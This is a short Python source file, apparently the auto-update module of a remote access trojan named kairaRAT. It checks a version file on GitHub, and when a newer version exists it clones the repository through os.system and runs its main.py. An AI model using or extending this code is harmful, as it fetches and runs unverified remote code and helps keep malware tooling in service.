import json
from urllib.request import urlopen
import os
from time import sleep
from shutil import move
from colorama import init, Fore

version_link = "https://raw.githubusercontent.com/st4inl3s5/kairaRAT/main/modules/version.json"

init()

def get_latest_info():
    global latest_info
    url = urlopen(version_link)
    latest_info = json.loads(url.read().decode())
    print(Fore.GREEN + "\n[+]Fetching version number from internet...")
    return latest_info


def get_current_info():
    global current_info
    try:
        with open("modules/version.json", "r") as file:
            current_info = json.loads(file.read())
        return current_info
    except FileNotFoundError:
        return {"version": ""}


def is_update_avaliable():
    return get_current_info()["version"] != get_latest_info()["version"]


def update():
    update_avaliable = is_update_avaliable()
    if update_avaliable:
        print(Fore.RED + f"\n[!]An update available.Your version {current_info} but current version is {latest_info}" + Fore.GREEN + "\n\n[+]Update starting..." + Fore.RESET)
        sleep(2)
        os.system("git clone https://github.com/st4inl3s5/kairaRAT")
        move("kairaRAT", "../kairaRAT")
        print(Fore.GREEN + "\n\n[+]kairaRAT has been updated successfully.\n\n")
        os.system("python3 ../kairaRAT/main.py -h")
    else:
        print(Fore.GREEN + "\n[+]Your version is up to date.")
